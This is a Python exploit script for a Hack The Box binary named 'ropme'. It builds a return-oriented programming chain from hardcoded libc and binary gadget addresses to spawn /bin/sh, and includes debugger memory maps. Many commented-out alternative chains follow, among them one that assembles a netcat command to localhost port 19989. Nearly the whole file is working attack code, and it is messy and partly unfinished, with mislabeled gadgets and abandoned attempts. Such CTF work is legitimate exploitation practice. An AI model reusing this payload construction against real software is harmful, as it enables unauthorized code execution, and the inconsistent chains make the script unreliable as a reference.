#!/usr/bin/env python

import struct
import subprocess as subp
import time

#0x7ffff7af1a60 <execve>
#break *0x7ffff7a57503
#Return PTR 0x7fffffffe238
#seg fault at 71 chars
#0x7ffff7af1a65 syscall
#return pointer points to exit
#execve at print execve

#fgets - rdx = ptr to fd, rdi = ptr to buffer to fill
#puts
# gdb-peda$ vmmap
# Start              End                Perm	Name
# 0x00400000         0x00401000         r-xp	/root/hackthebox/ropme
# 0x00600000         0x00601000         r--p	/root/hackthebox/ropme
# 0x00601000         0x00602000         rw-p	/root/hackthebox/ropme
# 0x00007ffff7a3c000 0x00007ffff7bcf000 r-xp	/lib/x86_64-linux-gnu/libc-2.24.so
# 0x00007ffff7bcf000 0x00007ffff7dcf000 ---p	/lib/x86_64-linux-gnu/libc-2.24.so
# 0x00007ffff7dcf000 0x00007ffff7dd3000 r--p	/lib/x86_64-linux-gnu/libc-2.24.so
# 0x00007ffff7dd3000 0x00007ffff7dd5000 rw-p	/lib/x86_64-linux-gnu/libc-2.24.so
# 0x00007ffff7dd5000 0x00007ffff7dd9000 rw-p	mapped
# 0x00007ffff7dd9000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.24.so
# 0x00007ffff7fcf000 0x00007ffff7fd1000 rw-p	mapped
# 0x00007ffff7ff5000 0x00007ffff7ff8000 rw-p	mapped
# 0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
# 0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
# 0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.24.so
# 0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.24.so
# 0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
# 0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
# 0xffffffffff60000 0xffffffffff601000 r-xp	[vsyscall]
# note 0x7fffffffebe0:	"USER=root"

shellcode0 = "//bin/sh"
#shellcode1 = " localho"
#shellcode2 = "st 19989"
# shellcode3 = "host 199"
# shellcode4 = "89\"\x00\x00\x00\x00\x00"
# roplist.append(y(shellcode0)) 
# roplist.append(y(shellcode1)) 
# roplist.append(y(shellcode2)) 
# roplist.append(y(shellcode3)) 
# roplist.append(y(shellcode4)) 

#shellcode0 = "//bin/sh"
# shellcode1 = " -c /bin"
# shellcode2 = "/nc loca"
# shellcode3 = "lhost 19"
# shellcode4 = "989\x00\x00\x00\x00\x00"

def x(roplist):

	struct_rop = [ (struct.pack('<Q',i)) for i in roplist]
	#struct_rop = [ i.replace("\\","\\\\") for i in struct_rop]
	#print struct_rop
	return ''.join(struct_rop)

def y(shellcodeStr):
	shellcodeStr = shellcodeStr[::-1]
	shellcodeStr = shellcodeStr.encode('hex')
	shellcodeStr = int(shellcodeStr,16)
	return shellcodeStr

roplist = []
roplist.append(y(shellcode0)) 
roplist.append(0x0000000000000000) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x4141414141414141) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x4141414141414141) #junk
roplist.append(0x4141414141414141) #junk
roplist.append(0x4141414141414141) #junk <----------
roplist.append(0x00000000004004c9)# add main + 1
roplist.append(0x00007ffff7a5bc1a) #pop rsi; ret
roplist.append(0x0000000000000000) #junk
roplist.append(0x00000000004004c9) # pop rdi ; ret
roplist.append(0x00000000004004c9) # pop rdi ; ret
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00007ffff7af4630) # system syscall
roplist.append(0x00000000004004c9) #junk
roplist.append(0x00000000004004c9) #junk

# roplist.append(0x00007ffff7a71fc8) # pop rax ; ret
# roplist.append(0x00000000000001e3) # jump offset to outside stack
# roplist.append(0x00007ffff7abe38a) # add rax,rdi; ret
# roplist.append(0x00007ffff7a3db92) # pop rdx; ret
# roplist.append(0x00007ffff7af4630) # system syscall
# roplist.append(0x00007ffff7a67c62) # mov QWORD PTR [rax],rdx; ret
# roplist.append(0x00007ffff7a3db92) # pop rdx; ret
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x00000000004006d1) #pop rsi; pop r15 ;ret
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x00007ffff7b186ad)# add rsp,0x120; ret

# roplist.append(0x00007ffff7a7e981) # mov rax,rdx; ret (rdx points to bottom of stack)
# roplist.append(0x00007ffff7a5bc6a) # pop rdi ; ret
# roplist.append(0x0000000000000000) # rdi value
# roplist.append(0x00007ffff7abe38a) # add rax,rdi; ret



print x(roplist)


# roplist.append(y(shellcode0))	
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk <----------RBP
# roplist.append(0x00007ffff7a7e981) # mov rax,rdx; ret (rdx points to bottom of stack)
# roplist.append(0x00007ffff7a5bc6a) # pop rdi ; ret
# roplist.append(0x0000000000000264) # rdi value
# roplist.append(0x00007ffff7abe38a) # add rax,rdi; ret
# roplist.append(0x00007ffff7a67c62) # mov QWORD PTR [rax],rdx; ret
# roplist.append(0x00007ffff7a5bc1a) #pop rsi; ret
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x00007ffff7a3db92) # pop rdx; ret
# roplist.append(0x00000000004004c9) # ret
# roplist.append(0x00007ffff7b52fa0) #mov rdi,rsp; call rdx; add rsp,0x38; ret
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x00007ffff7b53c72) # add rsi,rax; mov QWORD PTR [rdi+0x18],rsi; ret
# roplist.append(0x00007ffff7b47f9e) #vmov QWORD PTR [rsi+0x10],rax; ret
# roplist.append(0x00007ffff7a3db92) # pop rdx ; ret
# roplist.append(0x00007ffff7af4630)	
# roplist.append(0x00007ffff7a5bc6a) # pop rdi ; ret
# roplist.append(0x0000000000000008) # rdi value
# roplist.append(0x00007ffff7abe38a) # add rax,rdi; ret
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x00007ffff7a5bc1a) #pop rsi; ret
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x00007ffff7b53c72) # add rsi,rax; mov QWORD PTR [rdi+0x18],rsi; ret
# roplist.append(0x00007ffff7a3db92) # pop rdx; ret
# roplist.append(0x00000000004004c9) # ret
# roplist.append(0x00007ffff7b176b9) # read
# roplist.append(0x00007ffff7a6e6e3) # ret 0xb8 (200)
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x00007ffff7aa3480) #xor edx,edx; mov rax,rdx; ret
# roplist.append(0x00007ffff7af4630) #system
# roplist.append(0x00000000004006d3) #pop rdi ; ret
# roplist.append(0x0000000000000002) #junk
# roplist.append(0x00007ffff7af41a0) #junk

# roplist.append(0x0000000000400627) #junk
# roplist.append(0x000000000040063f) #junk
# roplist.append(0x00007ffff7b31ab3) #mov rbp,rsp; pop rbp; ret
# roplist.append(0x00007ffff7b31ab3) #mov rbp,rsp; pop rbp; ret
# roplist.append(0x00007ffff7b31ab3) #mov rbp,rsp; pop rbp; ret

# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(y(shellcode0))	   #junk <----------RBP
# roplist.append(0x00007ffff7a7e981) # mov rax,rdx; ret (rdx points to bottom of stack)
# roplist.append(0x00007ffff7a3db92) # pop rdx
# roplist.append(0x00000000004004c9) #ret
# roplist.append(0x00007ffff7a5bc6a) # pop rdi ; ret
# roplist.append(0x0000000000000204) # rdi value
# roplist.append(0x00007ffff7abe38a) # add rax,rdi; ret
# roplist.append(0x00007ffff7b52fa0) #mov rdi,rsp; call rdx; add rsp,0x38; ret
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x00007ffff7a5bc1a) #pop rsi; ret
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x00007ffff7b53c72) # add rsi,rax; mov QWORD PTR [rdi+0x18],rsi; ret
# roplist.append(0x00007ffff7a3db92) # pop rdx; ret
# roplist.append(0x0000000000000204) #junk
# roplist.append(0x00007ffff7b176b9) # read
# roplist.append(0x00007ffff7a6e6e3) # ret 0xb8 (200)
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk
# roplist.append(0x4141414141414141) #junk


# shellcode = "//bin/sh"
# shellcode = shellcode[::-1]
# shellcode = shellcode.encode('hex')
# shellcode = int(shellcode,16)
# roplist = []

#0x4006f8
#roplist.append(0x0000000000400738) #junk banner message + 40

#roplist.append(0x000000000040064e) # main <+40>
# roplist.append(0x0000000000400723) #ptr to banner message - 50
#roplist.append(0x00007ffff7af41f0) #pause syscall
# roplist.append(0x00007ffff7a5c2e1) #pause syscall
# roplist.append(0x0000000000400590) # pop rbp ; ret
# roplist.append(0x00000000004006cb) #pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x00000000004006d3) # pop rdi ; ret
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x00000000004004c9) #ret
# roplist.append(0x0000000000400590) # pop rbp ; ret
# roplist.append(0x0000000000000000) #junk
#roplist.append(0x00007fffffffe140) # EXP env
#roplist.append(0x00007ffff7af4630) #mov eax, 0x3b (0x8509bc0 bytes away for stack position)
								   #0x00007ffff7af4635) #syscall
#roplist.append(0x00007ffff7a71980) #redirect to read <---- doesn't do anything. crashes
#roplist.append(0x00007ffff7aa3340) #junk
#roplist.append(0x0000000000400590) #pop RBP; ret
#roplist.append(0x00007fffffffe1c8) #original RBP								  
#roplist.append(0x000000000040066b) #redirect to read <---- doesn't do anything. crashes								   
#roplist.append(0x0000000000400666)

# roplist.append(shellcode) 
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x00007ffff7aa3480) # xor edx, edx ; mov rax, rdx ;ret fgets+320
# roplist.append(0x00000000004006d3) #pop rdi ; ret
# roplist.append(0x00007fffffffe190) # EXP env
# roplist.append(0x00000000004006d1) #pop rsi ; pop r15 ; ret
# roplist.append(0x0000000000000000) # EXP env
# roplist.append(0x00007fffffffe190) # EXP env
# roplist.append(0x00007ffff7af4630) #mov eax, 0x3b (0x8509bc0 bytes away for stack position)
# 								   #0x00007ffff7af4635) #syscall
# # roplist.append(0x00007ffff7a71980) #redirect to read <---- doesn't do anything. cras

# proc = subp.Popen("./ropme", stdin=subp.PIPE, stdout=subp.PIPE)

# banner = "ROP me outside, how 'about dah?"
# output, error = proc.communicate()

# while True:

# 	if output.strip() == banner:
# 		print "[+] Sending payload..."
# 		proc.stdin.write(shh)
# 		time.sleep(3)
# 		proc.stdin.write("ls")
# 	if output == '' and proc.poll() is not None:
# 		break

# 	if output:
# 		print output.strip()
